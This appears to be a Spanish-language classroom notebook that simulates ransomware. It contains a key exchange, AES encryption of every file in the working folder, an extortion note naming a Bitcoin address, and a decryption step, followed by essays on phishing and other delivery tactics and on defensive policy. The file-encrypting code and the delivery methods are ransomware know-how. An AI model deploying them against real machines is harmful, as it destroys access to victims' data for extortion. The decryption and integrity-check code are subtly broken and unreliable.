{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "provenance": []
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "cells": [
    {
      "cell_type": "code",
      "source": [
        "pip install pycryptodome"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "pB-kg3bxJ9vg",
        "outputId": "89cf6ab1-f477-4a07-8f0a-6a918e8ed87f"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Collecting pycryptodome\n",
            "  Downloading pycryptodome-3.23.0-cp37-abi3-manylinux_2_17_x86_64.manylinux2014_x86_64.whl.metadata (3.4 kB)\n",
            "Downloading pycryptodome-3.23.0-cp37-abi3-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (2.3 MB)\n",
            "\u001b[?25l   \u001b[90m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\u001b[0m \u001b[32m0.0/2.3 MB\u001b[0m \u001b[31m?\u001b[0m eta \u001b[36m-:--:--\u001b[0m\r\u001b[2K   \u001b[91m━━━━━━━━\u001b[0m\u001b[90m╺\u001b[0m\u001b[90m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\u001b[0m \u001b[32m0.5/2.3 MB\u001b[0m \u001b[31m14.5 MB/s\u001b[0m eta \u001b[36m0:00:01\u001b[0m\r\u001b[2K   \u001b[91m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\u001b[0m\u001b[91m╸\u001b[0m \u001b[32m2.3/2.3 MB\u001b[0m \u001b[31m40.7 MB/s\u001b[0m eta \u001b[36m0:00:01\u001b[0m\r\u001b[2K   \u001b[90m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\u001b[0m \u001b[32m2.3/2.3 MB\u001b[0m \u001b[31m26.7 MB/s\u001b[0m eta \u001b[36m0:00:00\u001b[0m\n",
            "\u001b[?25hInstalling collected packages: pycryptodome\n",
            "Successfully installed pycryptodome-3.23.0\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "from Crypto.PublicKey import RSA\n",
        "from Crypto.Signature import pkcs1_15\n",
        "from Crypto.Hash import SHA256\n",
        "from Crypto.Cipher import PKCS1_OAEP\n",
        "from Crypto.Random import get_random_bytes\n",
        "from glob import glob\n",
        "\n",
        "# Generar claves de largo plazo\n",
        "print(\"Generando claves de largo plazo...\")\n",
        "clave_privada_atacante = RSA.generate(2048)\n",
        "clave_publica_atacante = clave_privada_atacante.publickey()\n",
        "clave_privada_victima = RSA.generate(2048)\n",
        "clave_publica_victima = clave_privada_victima.publickey()\n",
        "\n",
        "# Crear certificados\n",
        "cert_atacante = {'id': 'atacante', 'pk': clave_publica_atacante}\n",
        "cert_victima = {'id': 'victima', 'pk': clave_publica_victima}\n",
        "\n",
        "# Generar claves efímeras (corto plazo)\n",
        "print(\"Generando claves efímeras...\")\n",
        "clave_efimera_priv_atacante = RSA.generate(2048)\n",
        "clave_efimera_pub_atacante = clave_efimera_priv_atacante.publickey()\n",
        "clave_efimera_priv_victima = RSA.generate(2048)\n",
        "clave_efimera_pub_victima = clave_efimera_priv_victima.publickey()\n",
        "\n",
        "# Firmar claves públicas efímeras\n",
        "print(\"Firmando claves públicas efímeras...\")\n",
        "# Atacante firma su clave efímera\n",
        "msg_atacante = clave_efimera_pub_atacante.export_key('DER')\n",
        "h_atacante = SHA256.new(msg_atacante)\n",
        "firma_atacante = pkcs1_15.new(clave_privada_atacante).sign(h_atacante)\n",
        "# Víctima firma su clave efímera\n",
        "msg_victima = clave_efimera_pub_victima.export_key('DER')\n",
        "h_victima = SHA256.new(msg_victima)\n",
        "firma_victima = pkcs1_15.new(clave_privada_victima).sign(h_victima)\n",
        "\n",
        "# Verificar firmas (simulación de intercambio)\n",
        "print(\"Verificando firmas...\")\n",
        "# Víctima verifica la firma del atacante\n",
        "msg_recibido_atacante = clave_efimera_pub_atacante.export_key('DER')\n",
        "h_recibido_atacante = SHA256.new(msg_recibido_atacante)\n",
        "try:\n",
        "    pkcs1_15.new(cert_atacante['pk']).verify(h_recibido_atacante, firma_atacante)\n",
        "    print(\"Víctima: Firma del atacante válida\")\n",
        "except (ValueError, TypeError):\n",
        "    print(\"Víctima: Firma del atacante inválida\")\n",
        "    raise\n",
        "# Atacante verifica la firma de la víctima\n",
        "msg_recibido_victima = clave_efimera_pub_victima.export_key('DER')\n",
        "h_recibido_victima = SHA256.new(msg_recibido_victima)\n",
        "try:\n",
        "    pkcs1_15.new(cert_victima['pk']).verify(h_recibido_victima, firma_victima)\n",
        "    print(\"Atacante: Firma de la víctima válida\")\n",
        "except (ValueError, TypeError):\n",
        "    print(\"Atacante: Firma de la víctima inválida\")\n",
        "    raise\n",
        "\n",
        "# Generar partes del secreto (1024 bits = 128 bytes)\n",
        "print(\"Generando partes del secreto...\")\n",
        "S_A = get_random_bytes(128)  # Parte del atacante\n",
        "S_B = get_random_bytes(128)  # Parte de la víctima\n",
        "\n",
        "# Cifrar partes del secreto\n",
        "print(\"Cifrando partes del secreto...\")\n",
        "# Atacante cifra S_A para la víctima\n",
        "cipher_atacante = PKCS1_OAEP.new(clave_efimera_pub_victima)\n",
        "ciphertext_A = cipher_atacante.encrypt(S_A)\n",
        "# Víctima cifra S_B para el atacante\n",
        "cipher_victima = PKCS1_OAEP.new(clave_efimera_pub_atacante)\n",
        "ciphertext_B = cipher_victima.encrypt(S_B)\n",
        "\n",
        "# Descifrar partes del secreto (simulación de intercambio)\n",
        "print(\"Descifrando partes del secreto...\")\n",
        "# Víctima descifra S_A\n",
        "cipher_victima_dec = PKCS1_OAEP.new(clave_efimera_priv_victima)\n",
        "S_A_recibido = cipher_victima_dec.decrypt(ciphertext_A)\n",
        "# Atacante descifra S_B\n",
        "cipher_atacante_dec = PKCS1_OAEP.new(clave_efimera_priv_atacante)\n",
        "S_B_recibido = cipher_atacante_dec.decrypt(ciphertext_B)\n",
        "\n",
        "# Calcular secreto compartido con XOR\n",
        "print(\"Calculando secreto compartido...\")\n",
        "S_atacante = bytes(a ^ b for a, b in zip(S_A, S_B_recibido))\n",
        "S_victima = bytes(a ^ b for a, b in zip(S_A_recibido, S_B))\n",
        "\n",
        "# Verificar que el secreto sea el mismo\n",
        "assert S_atacante == S_victima, \"Los secretos compartidos no coinciden\"\n",
        "print(\"Secreto compartido generado exitosamente.\")\n",
        "print(\"Secreto compartido (en hexadecimal):\", S_atacante.hex())"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "0poJUpEzLCqS",
        "outputId": "76d51dd7-d051-4eed-a327-4762cffad5fb"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Generando claves de largo plazo...\n",
            "Generando claves efímeras...\n",
            "Firmando claves públicas efímeras...\n",
            "Verificando firmas...\n",
            "Víctima: Firma del atacante válida\n",
            "Atacante: Firma de la víctima válida\n",
            "Generando partes del secreto...\n",
            "Cifrando partes del secreto...\n",
            "Descifrando partes del secreto...\n",
            "Calculando secreto compartido...\n",
            "Secreto compartido generado exitosamente.\n",
            "Secreto compartido (en hexadecimal): 986b8110689f8417f7c7f6caf8e9cc8b6f4e14dff0f7beddcf2595b7dc9a8c2c193da02040c861bac5a366a6236ecac10c5747381d6d1e22b568d30d4767fc29b8494687410268f704120808207a76a3fd1b521387037e8c580cc78fd015e65affdd46a982776764aa63b9550ab66dd6c76d007dee3ac9b75a219dd37a23d7de\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "from Crypto.Cipher import AES\n",
        "from Crypto.Hash import SHA256\n",
        "from Crypto.Util.Padding import pad\n",
        "from Crypto.Random import get_random_bytes\n",
        "import os\n",
        "\n",
        "hash_original = None\n",
        "\n",
        "# Función para derivar la llave simétrica usando SHA-256\n",
        "def derivar_llave(secreto_comun):\n",
        "    \"\"\"Deriva una llave simétrica de 256 bits a partir del secreto común usando SHA-256.\"\"\"\n",
        "    return SHA256.new(secreto_comun).digest()\n",
        "\n",
        "# Función para cifrar un archivo usando AES-256-CBC\n",
        "def cifrar_archivo(ruta_archivo, llave):\n",
        "    \"\"\"Cifra el archivo especificado usando AES-256-CBC y guarda el resultado en un nuevo archivo.\"\"\"\n",
        "    with open(ruta_archivo, 'rb') as f:\n",
        "        datos = f.read()\n",
        "\n",
        "    hash_original = SHA256.new(datos).digest()\n",
        "\n",
        "    # Generar un IV aleatorio\n",
        "    iv = get_random_bytes(16)\n",
        "\n",
        "    # Crear el cifrador AES en modo CBC\n",
        "    cipher = AES.new(llave, AES.MODE_CBC, iv)\n",
        "\n",
        "    # Cifrar los datos (con padding si es necesario)\n",
        "    ciphertext = cipher.encrypt(pad(datos, AES.block_size))\n",
        "\n",
        "    # Guardar el IV y el ciphertext en un nuevo archivo\n",
        "    with open(ruta_archivo + '.encrypted', 'wb') as f:\n",
        "        f.write(iv + hash_original + ciphertext)\n",
        "\n",
        "# Simulación del secreto común (obtenido de la fase anterior)\n",
        "# En la práctica, esto sería el resultado del protocolo AKE v.2\n",
        "secreto_comun = S_victima#bytes.fromhex('00112233445566778899aabbccddeeff')  # Ejemplo de 16 bytes\n",
        "\n",
        "# Derivar la llave simétrica\n",
        "llave_aes = derivar_llave(secreto_comun)\n",
        "print(\"Llave AES derivada:\", llave_aes.hex())\n",
        "\n",
        "list_files = glob('*.*')\n",
        "print(\"Archivos TXT:\", list_files)\n",
        "\n",
        "# Cifrar los archivos de prueba\n",
        "for file in list_files:\n",
        "    cifrar_archivo(file, llave_aes)\n",
        "    print(f\"Archivo {file} cifrado y guardado como {file}.encrypted\")"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "PP4WDJ_yLd9o",
        "outputId": "e2593e71-b695-4646-b0c3-85489972bf2d"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Llave AES derivada: e9e186c4ed74817ead52d50754fae30145613c90268102b8e3d553f394c118ab\n",
            "Archivos TXT: ['text_to_encrypt_2.txt', 'text_to_encrypt.txt']\n",
            "Archivo text_to_encrypt_2.txt cifrado y guardado como text_to_encrypt_2.txt.encrypted\n",
            "Archivo text_to_encrypt.txt cifrado y guardado como text_to_encrypt.txt.encrypted\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "from IPython.display import HTML, display\n",
        "\n",
        "def show_notification():\n",
        "    message = \"\"\"\n",
        "    <h1 style='color: red; text-align: center;'>¡ATENCIÓN!</h1>\n",
        "    <p style='font-size: 16px; text-align: center;'>\n",
        "        Sus archivos han sido cifrados por un ransomware.<br>\n",
        "        Para recuperar el acceso a sus archivos, debe realizar un pago de 0.1 BTC a la siguiente dirección:<br>\n",
        "        <strong>1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa</strong><br>\n",
        "        Una vez realizado el pago, contacte a <a href='mailto:recuperacion@example.com'>recuperacion@example.com</a> con el comprobante.<br>\n",
        "        Tiene 48 horas para realizar el pago, de lo contrario, la llave de descifrado será eliminada permanentemente.\n",
        "    </p>\n",
        "    \"\"\"\n",
        "    display(HTML(message))\n",
        "\n",
        "# Show the notification in the output\n",
        "show_notification()\n",
        "\n",
        "# Save the instructions to a text file\n",
        "with open('NOTIFICACION.txt', 'w') as f:\n",
        "    f.write(\"\"\"\n",
        "¡ATENCIÓN!\n",
        "Sus archivos han sido cifrados por un ransomware.\n",
        "Para recuperar el acceso a sus archivos, debe realizar un pago de 0.1 BTC a la siguiente dirección:\n",
        "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa\n",
        "Una vez realizado el pago, contacte a recuperacion@example.com con el comprobante.\n",
        "Tiene 48 horas para realizar el pago, de lo contrario, la llave de descifrado será eliminada permanentemente.\n",
        "\"\"\")\n",
        "\n",
        "print(\"Se ha creado un archivo 'NOTIFICACION.txt' con las instrucciones.\")"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 199
        },
        "id": "vLcBaCP-Lj53",
        "outputId": "dfef6996-1c61-4270-fe74-c031e3bb7b1f"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "<IPython.core.display.HTML object>"
            ],
            "text/html": [
              "\n",
              "    <h1 style='color: red; text-align: center;'>¡ATENCIÓN!</h1>\n",
              "    <p style='font-size: 16px; text-align: center;'>\n",
              "        Sus archivos han sido cifrados por un ransomware.<br>\n",
              "        Para recuperar el acceso a sus archivos, debe realizar un pago de 0.1 BTC a la siguiente dirección:<br>\n",
              "        <strong>1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa</strong><br>\n",
              "        Una vez realizado el pago, contacte a <a href='mailto:recuperacion@example.com'>recuperacion@example.com</a> con el comprobante.<br>\n",
              "        Tiene 48 horas para realizar el pago, de lo contrario, la llave de descifrado será eliminada permanentemente.\n",
              "    </p>\n",
              "    "
            ]
          },
          "metadata": {}
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Se ha creado un archivo 'NOTIFICACION.txt' con las instrucciones.\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "from Crypto.Cipher import AES\n",
        "from Crypto.Hash import SHA256\n",
        "from Crypto.Util.Padding import unpad\n",
        "\n",
        "hash_recuperado = None\n",
        "\n",
        "# Función para descifrar archivos\n",
        "def descifrar_archivo(ruta_encrypted, llave):\n",
        "    \"\"\"Descifra un archivo cifrado con AES-256-CBC\"\"\"\n",
        "    with open(ruta_encrypted, 'rb') as f:\n",
        "        iv = f.read(16)  # Los primeros 16 bytes son el IV\n",
        "        ciphertext = f.read()  # Resto es el texto cifrado\n",
        "\n",
        "    # Crear cifrador y descifrar\n",
        "    cipher = AES.new(llave, AES.MODE_CBC, iv)\n",
        "    datos_plana = unpad(cipher.decrypt(ciphertext), AES.block_size)\n",
        "\n",
        "    hash_recuperado = SHA256.new(datos_plana).digest()\n",
        "\n",
        "    # Guardar archivo original (removiendo la extensión .encrypted)\n",
        "    nombre_original = os.path.splitext(ruta_encrypted)[0]\n",
        "    with open(nombre_original, 'wb') as f:\n",
        "        f.write(datos_plana)\n",
        "\n",
        "# Simulación de recuperación tras pago (usando el mismo secreto)\n",
        "print(\"\\n=== FASE DE RECUPERACIÓN ===\")\n",
        "\n",
        "# 1. El atacante \"envía\" las instrucciones (simulado por el código)\n",
        "print(\"Instrucciones del atacante:\")\n",
        "print(\"1. Usar el secreto compartido para derivar la llave\")\n",
        "print(\"2. Ejecutar el proceso de descifrado\")\n",
        "\n",
        "# 2. La víctima deriva la misma llave (ya tiene el secreto)\n",
        "llave_recuperacion = derivar_llave(secreto_comun)\n",
        "print(\"\\nLlave de recuperación:\", llave_recuperacion.hex())\n",
        "\n",
        "list_files_encrypted = glob('*.*.encrypted')\n",
        "print(\"Archivos TXT:\", list_files)\n",
        "\n",
        "# 3. Descifrar todos los archivos .encrypted\n",
        "for file in list_files_encrypted:\n",
        "    descifrar_archivo(file, llave_recuperacion)\n",
        "    print(f\"Archivo {file} descifrado como {os.path.splitext(file)[0]}\")\n",
        "\n",
        "if hash_recuperado != hash_original:\n",
        "    raise ValueError(\"Integridad comprometida\")"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "Q7NxE4JiLqka",
        "outputId": "292f37ae-db5c-45bd-d66c-34774a9d0cbd"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "\n",
            "=== FASE DE RECUPERACIÓN ===\n",
            "Instrucciones del atacante:\n",
            "1. Usar el secreto compartido para derivar la llave\n",
            "2. Ejecutar el proceso de descifrado\n",
            "\n",
            "Llave de recuperación: e9e186c4ed74817ead52d50754fae30145613c90268102b8e3d553f394c118ab\n",
            "Archivos TXT: ['text_to_encrypt_2.txt', 'text_to_encrypt.txt']\n",
            "Archivo text_to_encrypt.txt.encrypted descifrado como text_to_encrypt.txt\n",
            "Archivo text_to_encrypt_2.txt.encrypted descifrado como text_to_encrypt_2.txt\n"
          ]
        }
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "## Asuman el rol del atacante. Imaginen que realizan una implementación funcional y real de su malware y lo convierten en un arma de ataque ¿Qué estrategias utilizarían para que la víctima lo instale en su máquina? Es decir, ¿Cómo implementarían el paso 1 descrito en la operación?\n",
        "\n",
        "Como atacante, una estrategia efectiva para lograr que la víctima instale el ransomware consistiría en aprovechar técnicas de ingeniería social cuidadosamente diseñadas. Una de las formas más comunes sería el uso de correos electrónicos de phishing dirigidos, en los que se suplanta la identidad de una fuente confiable, como un proveedor o compañero de trabajo, incluyendo archivos adjuntos aparentemente inofensivos (como documentos de Word o Excel con macros maliciosas) o enlaces que conducen a páginas web falsas pero creíbles que descargan el malware. Otra vía de infección efectiva podría ser la manipulación de sitios web legítimos frecuentados por el objetivo, inyectando código malicioso que aproveche vulnerabilidades del navegador. También sería factible distribuir el ransomware como parte de instaladores de software crackeado o actualizaciones falsas, que las víctimas podrían descargar de foros o sitios de descarga no oficiales. En escenarios más elaborados, se podrían utilizar dispositivos USB infectados dejados deliberadamente en lugares públicos o atacar la cadena de suministro, comprometiendo software legítimo antes de que sea distribuido a los usuarios. Estas técnicas buscan siempre aprovechar el eslabón más débil de la seguridad: el usuario final."
      ],
      "metadata": {
        "id": "Nj68LEk7e-FD"
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "## Asuman el rol del defensor. Describan políticas y prácticas para garantizar la confidencialidad, la integridad y la disponibilidad de recursos informáticos en una organización. En particular, estas políticas y prácticas deberían mitigar la ocurrencia de este tipo de ataques.\n",
        "\n",
        "Desde la perspectiva del defensor, es fundamental establecer políticas y prácticas robustas que garanticen la confidencialidad, integridad y disponibilidad de los recursos informáticos para prevenir ataques como los de ransomware. Para mantener la confidencialidad, se deben implementar mecanismos de cifrado tanto en datos almacenados como en tránsito, así como aplicar controles de acceso estrictos, asegurando que solo el personal autorizado pueda manejar información crítica. La autenticación multifactor es también una medida clave para evitar accesos no autorizados. En cuanto a la integridad, es esencial contar con sistemas de detección y prevención de intrusiones, así como herramientas antimalware y de monitoreo de comportamiento que permitan identificar y bloquear amenazas en tiempo real. La verificación mediante hashing y el control de versiones contribuyen a garantizar que los archivos no hayan sido alterados de manera maliciosa. Para asegurar la disponibilidad, se deben realizar copias de seguridad de forma periódica y almacenarlas en medios desconectados de la red para prevenir su cifrado por parte del ransomware. Además, un plan de recuperación ante desastres bien definido y probado puede significar la diferencia entre una interrupción temporal y una pérdida significativa de datos y operaciones. Finalmente, la capacitación continua del personal sobre buenas prácticas de ciberseguridad, la aplicación del principio de mínimo privilegio y la actualización constante de sistemas y aplicaciones son elementos cruciales para fortalecer la postura defensiva de cualquier organización frente a este tipo de amenazas."
      ],
      "metadata": {
        "id": "Lu26No0nfJ4G"
      }
    }
  ]
}